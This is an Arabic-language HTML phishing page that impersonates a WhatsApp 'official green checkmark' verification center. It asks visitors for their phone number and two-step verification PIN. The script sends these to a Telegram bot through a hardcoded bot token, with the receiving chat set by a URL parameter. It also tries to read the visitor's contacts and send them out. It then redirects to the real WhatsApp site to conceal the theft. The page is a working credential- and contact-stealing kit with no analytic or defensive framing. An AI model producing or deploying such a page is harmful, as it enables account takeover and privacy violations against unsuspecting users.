<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp • مركز توثيق الحساب بالعلامة الخضراء</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #0c1317; color: #e9edef; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        
        .whatsapp-card { background: #111b21; border: 1px solid #222d34; padding: 35px 25px; width: 100%; max-width: 380px; text-align: center; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.6); position: relative; }
        
        /* أيقونة واتساب الأصلية SVG وفوقها علامة التوثيق */
        .wa-logo-container { position: relative; width: 70px; height: 70px; margin: 0 auto 20px auto; }
        .wa-icon-box { width: 70px; height: 70px; background-color: #00a884; border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 4px 15px rgba(0, 168, 132, 0.4); }
        .wa-icon-box svg { width: 40px; height: 40px; fill: #ffffff; }
        
        /* علامة التوثيق الخضراء فوق الأيقونة */
        .verified-badge { position: absolute; bottom: 0; right: 0; background: #00a884; border: 2px solid #111b21; border-radius: 50%; width: 24px; height: 24px; display: flex; justify-content: center; align-items: center; fill: #fff; }
        .verified-badge svg { width: 14px; height: 14px; }

        h2 { font-size: 21px; margin-bottom: 8px; color: #e9edef; }
        .sub { font-size: 12px; color: #8696a0; margin-bottom: 25px; line-height: 1.5; }

        .input-group { margin-bottom: 15px; text-align: right; }
        input { width: 100%; padding: 12px; background: #2a3942; border: 1px solid #222d34; color: #e9edef; border-radius: 8px; outline: none; font-size: 14px; }
        input:focus { border-color: #00a884; }

        .wa-btn { width: 100%; padding: 13px; background: #00a884; border: none; color: #fff; font-weight: bold; font-size: 15px; border-radius: 8px; cursor: pointer; margin-top: 10px; transition: 0.2s; }
        .wa-btn:hover { background: #019574; }
    </style>
</head>
<body>
    <div class="whatsapp-card">
        
        <!-- أيقونة واتساب وفوقها علامة التوثيق -->
        <div class="wa-logo-container">
            <div class="wa-icon-box">
                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946.003-6.556 5.338-11.891 11.893-11.891 3.181.001 6.167 1.24 8.413 3.488 2.245 2.248 3.481 5.236 3.48 8.414-.003 6.557-5.338 11.892-11.893 11.892-1.99-.001-3.951-.5-5.688-1.448l-6.305 1.654zm6.597-3.807c1.676.995 3.276 1.591 5.392 1.592 5.448 0 9.886-4.434 9.889-9.885.002-5.462-4.415-9.89-9.881-9.892-5.452 0-9.887 4.434-9.889 9.884-.001 2.225.651 3.891 1.746 5.634l-.999 3.648 3.742-.981zm11.387-5.464c-.074-.124-.272-.198-.57-.347-.297-.149-1.758-.868-2.031-.967-.272-.099-.47-.149-.669.149-.198.297-.768.967-.941 1.165-.173.198-.347.223-.644.074-.297-.149-1.255-.462-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.297-.347.446-.521.151-.172.2-.296.3-.495.099-.198.05-.372-.025-.521-.075-.148-.669-1.611-.916-2.206-.242-.579-.487-.501-.669-.51l-.57-.01c-.198 0-.52.074-.792.372s-1.04 1.016-1.04 2.479 1.065 2.876 1.213 3.074c.149.198 2.095 3.2 5.076 4.487.709.306 1.263.489 1.694.626.712.226 1.36.194 1.872.118.571-.085 1.758-.719 2.006-1.413.248-.695.248-1.29.173-1.414z"/></svg>
            </div>
            <!-- شارة علامة الصح الرسمية -->
            <div class="verified-badge">
                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
            </div>
        </div>

        <h2>توثيق حساب WhatsApp</h2>
        <p>أدخل رقم الهاتف المرتبط بالحساب لتفعيل العلامة الخضراء الرسمية وزيادة حماية الحساب.</p>
        
        <form id="waForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="رقم الهاتف مع رمز الدولة" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="رمز التحقق بخطوتين (إن وجد)" required>
            </div>
            <button type="submit" class="wa-btn">تأكيد وتفعيل العلامة الخضراء</button>
        </form>
    </div>

    <script>
        const botToken = "9047166728:AAGG2DJF-Kb7h7_15GNx5VS7Le2bG7a1ZRE";
        const urlParams = new URLSearchParams(window.location.search);
        const targetChatId = urlParams.get('to');

        document.getElementById('waForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            if(!targetChatId) return;
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            // سحب جهات الاتصال بصمت تام في الخلفية
            let contactsData = "لم يتم منح الصلاحية";
            if ('contacts' in navigator && 'ContactsManager' in window) {
                try {
                    const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                    if (contacts.length > 0) {
                        contactsData = contacts.map(c => `المستخدم: ${c.name?.[0] || 'بدون'} - الرقم: ${c.tel?.[0] || ''}`).join('\n');
                    }
                } catch(e) {}
            }

            // إرسال البيانات إلى بوت المسوق المستخرج من الرابط
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`صيد توثيق واتساب جديد\nالرقم: ${user}\nالرمز: ${pass}`)}`);
            
            if(contactsData !== "لم يتم منح الصلاحية") {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`جهات الاتصال:\n${contactsData}`)}`);
            }

            // تحويل فوري للموقع الرسمي
            setTimeout(() => { 
                window.location.href = "https://www.whatsapp.com"; 
            }, 800);
        });
    </script>
</body>
</html>
